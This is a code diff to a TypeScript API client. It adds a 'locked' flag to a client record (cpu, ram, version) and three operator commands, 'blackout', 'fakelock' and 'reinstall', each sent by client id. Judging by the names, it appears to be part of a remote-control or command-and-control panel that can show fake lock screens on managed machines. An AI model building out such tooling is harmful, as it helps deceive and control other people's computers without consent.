@@ -8,6 +8,7 @@ export interface Client {
   cpu?: string;
   ram?: string;
   version?: string;
+  locked?: boolean;
 }
 
 export interface LoginResponse {
@@ -351,5 +352,29 @@ export const api = {
       });
       await handleResponse(response);
       return response.text();
+  },
+
+  blackout: async (id: string): Promise<string> => {
+    const response = await fetch(`${BASE_URL}/api/blackout?id=${id}`, {
+      headers: getHeaders(),
+    });
+    await handleResponse(response);
+    return response.text();
+  },
+
+  fakelock: async (id: string): Promise<string> => {
+    const response = await fetch(`${BASE_URL}/api/fakelock?id=${id}`, {
+      headers: getHeaders(),
+    });
+    await handleResponse(response);
+    return response.text();
+  },
+
+  reinstall: async (id: string): Promise<string> => {
+    const response = await fetch(`${BASE_URL}/api/reinstall?id=${id}`, {
+      headers: getHeaders(),
+    });
+    await handleResponse(response);
+    return response.text();
   }
 };
